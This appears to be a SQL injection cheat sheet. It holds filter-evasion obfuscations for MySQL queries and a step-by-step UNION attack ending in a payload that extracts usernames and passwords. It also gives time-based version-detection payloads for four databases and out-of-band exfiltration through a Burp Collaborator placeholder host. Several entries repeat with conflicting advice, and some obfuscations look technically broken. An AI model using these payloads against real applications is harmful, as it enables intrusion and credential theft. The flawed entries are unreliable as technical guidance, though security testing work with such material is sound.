
##### ***Obfuscation techniques***
**String concatenation (MySQL):**
Original: **`CONCAT('foo','bar')`** Obfuscation: Use CHAR() function to represent the characters as ASCII codes. Obfuscated: **`CONCAT(CHAR(102,111,111),CHAR(98,97,114))`**
	
- Comments (MySQL):
Original: **`-- comment`** Obfuscation: Use MySQL's conditional comment syntax to confuse parsers. Obfuscated: **`/*!50000-- comment*/`**
	
- Database version (MySQL):
Original: **`SELECT @@version`** Obfuscation: Use MySQL's conditional comment syntax and the VERSION() function. Obfuscated: **`SELECT /*!50000@@*/VERSION()`**

- Database contents (MySQL):
Original: 
**`SELECT * FROM information_schema.tables`** 
Obfuscation: Use MySQL's conditional comment syntax in the table name. Obfuscated: **`SELECT * FROM /*!50000information_schema*/.tables`**
	
- Conditional errors (MySQL):
Original: **`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`** 
Obfuscation technique: Use MySQL's conditional comment syntax in the table name and column name. Obfuscated: **`SELECT IF(YOUR-CONDITION-HERE,(SELECT /*!50000table_name*/ FROM /*!50000information_schema*/.tables),'a')`**

- Time delays (MySQL):
Original: **`SELECT SLEEP(10)`** Obfuscation: Use the BENCHMARK() function to force the database to perform a time-consuming operation. Obfuscated: **`SELECT BENCHMARK(1000000,MD5('a'))`**
	
- Conditional time delays (MySQL):
Original: **`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`** Obfuscation: Use the BENCHMARK() function in the conditional expression to force a time-consuming operation. Obfuscated: **`SELECT IF(YOUR-CONDITION-HERE,BENCHMARK(1000000,MD5('a')),'a')`**
	
- String concatenation (MySQL): 
Original: **`CONCAT('foo','bar')`** Obfuscation: Use CHAR() function to represent the charters as ASCII codes. Obfuscated: **`CONCAT(CHAR(102,111,111),CHAR(98,97,114))`**
	
- Substring (MySQL): 
Original: **`SUBSTRING('foobar', 4, 2)`** Obfuscation: Use CHAR() function to represent the characters as ASCII codes. Obfuscated: **`SUBSTRING(CHAR(102,111,111,98,97,114), 4, 2)`**
	
- Comments (MySQL): 
Original: **`- comment`** Obfuscation: Use different comment styles or URL encoding. Obfuscated: **`%2D%2D%20comment`** or **`/*comment*/`**
	
- Database version (MySQL): 
Original: **`SELECT @@version`** Obfuscation: Use alternative system variables or functions. Obfuscated: **`SELECT VERSION()`**
	
- Database contents (MySQL): 
Original: **`SELECT * FROM information_schema.tables`** Obfuscation: Use alternative table names or schema. Obfuscated: **`SELECT * FROM INFORMATION_SCHEMA.TABLES`**
	
- Conditional errors (MySQL): 
Original: **`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`** Obfuscation: Use CHAR() function to represent the characters as ASCII codes. Obfuscated: **`SELECT IF(YOUR-CONDITION-HERE,(SELECT CHAR(116,97,98,108,101,95,110,97,109,101) FROM information_schema.tables),CHAR(97))`**
	
- Time delays (MySQL): 
Original: **`SELECT SLEEP(10)`** Obfuscation: Use alternative sleep functions or expressions. Obfuscated: **`SELECT IF(10=10, SLEEP(10), NULL)`**
	
- Conditional time delays (MySQL): 
Original: **`SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), 'a')`** Obfuscation: Use CHAR() function to represent the characters as ASCII codes. Obfuscated: **`SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), CHAR(97))`**
	
- DNS lookup (MySQL) [Windows only]: Original: **`LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')`** Obfuscation: Use alternative file loading functions or methods. Obfuscated: **`SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'`**
	
- DNS lookup with data exfiltration (MySQL) [Windows only]: Original: **`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'`** Obfuscation: Use alternative methods for writing query results to a file. Obfuscated: **`SELECT YOUR-QUERY-HERE INTO DUMPFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'`**
	
- Case modification: Use a mix of upper and lower case letters to obfuscate the SQL keywords. Original: **`SELECT * FROM users`** Obfuscated: **`sElEcT * fRoM users`**
	
- Inline comments: Insert comments within SQL keywords. Original: **`SELECT * FROM users`** Obfuscated: **`SEL/**/ECT * FROM users`**
	
- Base64 encoding (MySQL): Use **`FROM_BASE64()`** function to decode base64 encoded strings. Original: **`SELECT * FROM users`** Obfuscated: **`SELECT * FROM (SELECT FROM_BASE64('dXNlcnM=')) AS t`**
	
- String splitting: Split strings into smaller parts and concatenate them using string concatenation. Original: **`SELECT * FROM users`** Obfuscated: **`SELECT * FROM (SELECT 'us' || 'ers') AS t`**
	
- Using alternative functions: Use alternative functions that achieve the same result. Original: **`SELECT COUNT(*) FROM users`** Obfuscated: **`SELECT SUM(1) FROM users`**
	
- Replace simple operators with functions (MySQL): Use built-in functions to replace simple operators. Original: **`SELECT id FROM users WHERE id = 5`** Obfuscated: **`SELECT id FROM users WHERE GREATEST(id, 5) = LEAST(id, 5)`**
	
- Use mathematical operations to modify constant values: Modify constant values using mathematical operations. Original: **`SELECT id FROM users WHERE id = 5`** Obfuscated: **`SELECT id FROM users WHERE id = (7 - 2)`**
	
- Use a subquery for constant values: Replace constant values with a subquery. Original: **`SELECT id FROM users WHERE id = 5`** Obfuscated: **`SELECT id FROM users WHERE id = (SELECT 5)`**
	
- Encoding characters as URL-encoded values: Encode characters as URL-encoded values to obfuscate the query. Original: **`SELECT * FROM users`** Obfuscated: **`%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73`**
        
- **UNION attacks.**
    
    A UNION-based SQL Injection attack exploits a vulnerability in a website's database query. By leveraging the UNION SQL operator, the attacker can combine the results of the original query with results from their own crafted query, which can be designed to extract sensitive information from the database. Here's a simplified example of how this could work:
    
    1. **Identify the Injection Point**: The first step is to identify a place where user input is included directly in a SQL query. This could be a form input, URL parameter, cookies, etc. For example, you might find a URL like this:
        
        **`http://example.com/products?category=Books`**
        
        Here, the category parameter could be included directly in a SQL query on the server:
        
        **`SELECT * FROM products WHERE category = 'Books'`**
        
    2. **Find the Number of Columns**: Before using UNION, you need to know the number of columns returned by the original query. You can find this by trying an ORDER BY clause and incrementing the number until an error occurs. For example:
        
        **`http://example.com/products?category=Books' ORDER BY 1--`**
        
        Keep incrementing the number until you get an error. This tells you the number of columns.
        
    3. **Identify Column Types**: Next, you need to figure out which columns can handle the type of data you want to extract. For example, if you want to extract text data, you need to find a column that can handle text. You can do this by replacing column values with a string one by one until no error occurs. For example:
        
        **`http://example.com/products?category=Books' UNION SELECT 'a',NULL,NULL--`**
        
        This would tell you if the first column can handle text data. If an error occurs, move the 'a' to the next column and try again.
        
    4. **Extract Information**: Once you know the number of columns and which can handle the types of data you're interested in, you can craft a query to extract data. You can use the UNION SELECT statement to combine the results of the original query with results from an injected query.
        
        For example, if you found that the first column can handle text and there are three columns, you could extract usernames and passwords like this:
        
        **`http://example.com/products?category=Books' UNION SELECT username, password, NULL FROM users--`**
        
##### ***Time based attacks.***

- Time based version detection.
	- **Oracle**:
		
		The following payload would cause a delay of 10 seconds if the major version of Oracle is 12.
		
		```
		SELECT CASE WHEN TO_CHAR(SUBSTR(BANNER,1,2))='12' THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
		```
		
	- **SQL Server**:
		
		```
		IF SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') AS VARCHAR),1,2) = '12' WAITFOR DELAY '00:00:10'
		```
		
		The following payload would cause a delay of 10 seconds if the major version of SQL Server is 12.
		
	- **PostgreSQL**:
		
		The following payload would cause a delay of 10 seconds if the major version of PostgreSQL is 9.
		
		```
		SELECT CASE WHEN SUBSTRING(version(),1,1)='9' THEN pg_sleep(10) ELSE pg_sleep(0) END
		```
		
**MySQL**:
```
SELECT IF(SUBSTRING(@@version,1,1) = '5',SLEEP(10),'a')
```
The following payload would cause a delay of 10 seconds if the major version of MySQL is 5.